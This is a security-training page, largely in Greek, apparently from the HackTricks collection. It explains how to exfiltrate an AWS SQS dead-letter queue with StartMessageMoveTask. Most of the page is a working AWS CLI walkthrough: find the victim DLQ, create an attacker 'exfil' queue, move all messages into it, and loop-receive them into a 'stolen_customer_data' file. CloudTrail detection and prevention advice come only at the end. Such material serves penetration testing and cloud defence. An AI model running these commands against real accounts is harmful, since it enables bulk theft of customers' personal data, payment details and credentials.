# AWS – SQS DLQ Redrive Exfiltration via StartMessageMoveTask

{{#include ../../../banners/hacktricks-training.md}}

## Description

Κακοχρησιμοποιήστε τα message move tasks του SQS για να κλέψετε όλα τα συσσωρευμένα μηνύματα από την Dead-Letter Queue (DLQ) ενός θύματος ανακατευθύνοντάς τα σε μια ουρά υπό τον έλεγχο του επιτιθέμενου χρησιμοποιώντας `sqs:StartMessageMoveTask`. Αυτή η τεχνική εκμεταλλεύεται τη νόμιμη λειτουργία ανάκτησης μηνυμάτων του AWS για να εξαγάγει ευαίσθητα δεδομένα που έχουν μαζευτεί σε DLQs με την πάροδο του χρόνου.

## What is a Dead-Letter Queue (DLQ)?

Μια Dead-Letter Queue είναι μια ειδική SQS ουρά όπου στέλνονται αυτόματα μηνύματα όταν αποτυγχάνουν να επεξεργαστούν επιτυχώς από την κύρια εφαρμογή. Αυτά τα αποτυχημένα μηνύματα συχνά περιέχουν:
- Ευαίσθητα δεδομένα εφαρμογής που δεν μπόρεσαν να επεξεργαστούν
- Λεπτομέρειες σφαλμάτων και πληροφορίες debugging
- Personal Identifiable Information (PII)
- API tokens, credentials, ή άλλα secrets
- Business-critical transaction data

Οι DLQs λειτουργούν σαν «νεκροταφείο» για αποτυχημένα μηνύματα, καθιστώντας τες πολύτιμους στόχους αφού συσσωρεύουν ευαίσθητα δεδομένα με την πάροδο του χρόνου που οι εφαρμογές δεν μπόρεσαν να διαχειριστούν σωστά.

## Attack Scenario

**Real-world example:**
1. **E-commerce application** επεξεργάζεται παραγγελίες πελατών μέσω SQS
2. **Μερικές παραγγελίες αποτυγχάνουν** (προβλήματα πληρωμής, αποθέματος κ.λπ.) και μετακινούνται σε DLQ
3. **Η DLQ συσσωρεύει** εβδομάδες/μήνες αποτυχημένων παραγγελιών με δεδομένα πελατών: `{"customerId": "12345", "creditCard": "4111-1111-1111-1111", "orderTotal": "$500"}`
4. **Ο επιτιθέμενος αποκτά πρόσβαση** σε AWS credentials με δικαιώματα SQS
5. **Ο επιτιθέμενος ανακαλύπτει** ότι η DLQ περιέχει χιλιάδες αποτυχημένες παραγγελίες με ευαίσθητα δεδομένα
6. **Αντί να προσπαθεί να προσπελάσει μεμονωμένα μηνύματα** (αργό και εμφανές), ο επιτιθέμενος χρησιμοποιεί `StartMessageMoveTask` για να μεταφέρει μαζικά ΟΛΑ τα μηνύματα στην ουρά του
7. **Ο επιτιθέμενος εξάγει** όλα τα ιστορικά ευαίσθητα δεδομένα σε μία ενέργεια

## Requirements
- Η source queue πρέπει να είναι διαμορφωμένη ως DLQ (αναφερόμενη από τουλάχιστον μία queue RedrivePolicy).
- IAM permissions (εκτελούμενα ως ο συμβιβασμένος victim principal):
- Στην DLQ (source): `sqs:StartMessageMoveTask`, `sqs:GetQueueAttributes`.
- Στην destination queue: δικαίωμα παράδοσης μηνυμάτων (π.χ. queue policy που επιτρέπει `sqs:SendMessage` από το victim principal). Για προορισμούς στο ίδιο account αυτό συνήθως επιτρέπεται εξ ορισμού.
- Εάν είναι ενεργοποιημένο SSE-KMS: στο source CMK `kms:Decrypt`, και στο destination CMK `kms:GenerateDataKey`, `kms:Encrypt`.

## Impact
Εξαγωγή ευαίσθητων payloads που έχουν συσσωρευτεί σε DLQs (failed events, PII, tokens, application payloads) με μεγάλη ταχύτητα χρησιμοποιώντας τις εγγενείς SQS APIs. Λειτουργεί cross-account αν η destination queue policy επιτρέπει `SendMessage` από το victim principal.

## How to Abuse

- Εντοπίστε το victim DLQ ARN και βεβαιωθείτε ότι αναφέρεται όντως ως DLQ από κάποια ουρά (οποιαδήποτε ουρά αρκεί).
- Δημιουργήστε ή επιλέξτε μια destination queue υπό τον έλεγχο του επιτιθέμενου και πάρτε το ARN της.
- Ξεκινήστε ένα message move task από την victim DLQ προς την destination queue σας.
- Παρακολουθήστε την πρόοδο ή ακυρώστε αν χρειαστεί.

### CLI Example: Exfiltrating Customer Data from E-commerce DLQ

**Scenario**: Ένας επιτιθέμενος έχει συμβιβάσει AWS credentials και ανακάλυψε ότι μια e-commerce εφαρμογή χρησιμοποιεί SQS με μια DLQ που περιέχει αποτυχημένες προσπάθειες επεξεργασίας παραγγελιών πελατών.

1) **Discover and examine the victim DLQ**
```bash
# List queues to find DLQs (look for names containing 'dlq', 'dead', 'failed', etc.)
aws sqs list-queues --queue-name-prefix dlq

# Let's say we found: https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq
VICTIM_DLQ_URL="https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq"
SRC_ARN=$(aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

# Check how many messages are in the DLQ (potential treasure trove!)
aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" \
--attribute-names ApproximateNumberOfMessages
# Output might show: "ApproximateNumberOfMessages": "1847"
```
2) **Δημιουργήστε attacker-controlled destination queue**
```bash
# Create our exfiltration queue
ATTACKER_Q_URL=$(aws sqs create-queue --queue-name hacker-exfil-$(date +%s) --query QueueUrl --output text)
ATTACKER_Q_ARN=$(aws sqs get-queue-attributes --queue-url "$ATTACKER_Q_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

echo "Created exfiltration queue: $ATTACKER_Q_ARN"
```
3) **Εκτέλεση μαζικής κλοπής μηνυμάτων**
```bash
# Start moving ALL messages from victim DLQ to our queue
# This operation will transfer thousands of failed orders containing customer data
echo "Starting bulk exfiltration of $SRC_ARN to $ATTACKER_Q_ARN"
TASK_RESPONSE=$(aws sqs start-message-move-task \
--source-arn "$SRC_ARN" \
--destination-arn "$ATTACKER_Q_ARN" \
--max-number-of-messages-per-second 100)

echo "Move task started: $TASK_RESPONSE"

# Monitor the theft progress
aws sqs list-message-move-tasks --source-arn "$SRC_ARN" --max-results 10
```
4) **Συλλογή των κλεμμένων ευαίσθητων δεδομένων**
```bash
# Receive the exfiltrated customer data
echo "Receiving stolen customer data..."
aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--attribute-names All --message-attribute-names All \
--max-number-of-messages 10 --wait-time-seconds 5

# Example of what an attacker might see:
# {
#   "Body": "{\"customerId\":\"cust_12345\",\"email\":\"john@example.com\",\"creditCard\":\"4111-1111-1111-1111\",\"orderTotal\":\"$299.99\",\"failureReason\":\"Payment declined\"}",
#   "MessageId": "12345-abcd-6789-efgh"
# }

# Continue receiving all messages in batches
while true; do
MESSAGES=$(aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--max-number-of-messages 10 --wait-time-seconds 2 --output json)

if [ "$(echo "$MESSAGES" | jq '.Messages | length')" -eq 0 ]; then
echo "No more messages - exfiltration complete!"
break
fi

echo "Received batch of stolen data..."
# Process/save the stolen customer data
echo "$MESSAGES" >> stolen_customer_data.json
done
```
### Δια-λογαριαστικές σημειώσεις
- Η ουρά προορισμού πρέπει να έχει resource policy που επιτρέπει στον victim principal το `sqs:SendMessage` (και, αν χρησιμοποιείται, τα grants/permissions του KMS).

## Γιατί αυτή η επίθεση είναι αποτελεσματική

1. **Νόμιμη δυνατότητα του AWS**: Χρησιμοποιεί ενσωματωμένη λειτουργικότητα του AWS, καθιστώντας δύσκολο τον εντοπισμό ως κακόβουλο
2. **Μαζική λειτουργία**: Μεταφέρει χιλιάδες μηνύματα γρήγορα αντί για αργή μεμονωμένη πρόσβαση
3. **Ιστορικά δεδομένα**: DLQs συσσωρεύουν ευαίσθητα δεδομένα σε εβδομάδες/μήνες
4. **Κάτω από το ραντάρ**: Πολλοί οργανισμοί δεν παρακολουθούν στενά την πρόσβαση στα DLQ
5. **Cross-Account Capable**: Μπορεί να εξάγει σε λογαριασμό AWS του επιτιθέμενου εάν τα δικαιώματα το επιτρέπουν

## Ανίχνευση και Πρόληψη

### Ανίχνευση
Παρακολουθήστε το CloudTrail για ύποπτες κλήσεις API `StartMessageMoveTask`:
```json
{
"eventName": "StartMessageMoveTask",
"sourceIPAddress": "suspicious-ip",
"userIdentity": {
"type": "IAMUser",
"userName": "compromised-user"
},
"requestParameters": {
"sourceArn": "arn:aws:sqs:us-east-1:123456789012:sensitive-dlq",
"destinationArn": "arn:aws:sqs:us-east-1:attacker-account:exfil-queue"
}
}
```
### Πρόληψη
1. **Ελάχιστα δικαιώματα**: Περιορίστε τα δικαιώματα `sqs:StartMessageMoveTask` μόνο στους απαραίτητους ρόλους
2. **Παρακολούθηση DLQs**: Διαμορφώστε συναγερμούς CloudWatch για ασυνήθιστη δραστηριότητα στα DLQs
3. **Πολιτικές μεταξύ λογαριασμών**: Ελέγξτε προσεκτικά τις πολιτικές ουρών SQS που επιτρέπουν πρόσβαση μεταξύ λογαριασμών
4. **Κρυπτογράφηση DLQs**: Χρησιμοποιήστε SSE-KMS με περιορισμένες πολιτικές κλειδιών
5. **Τακτικός καθαρισμός**: Μην αφήνετε ευαίσθητα δεδομένα να σωρεύονται στα DLQs επ' αόριστον

{{#include ../../../banners/hacktricks-training.md}}
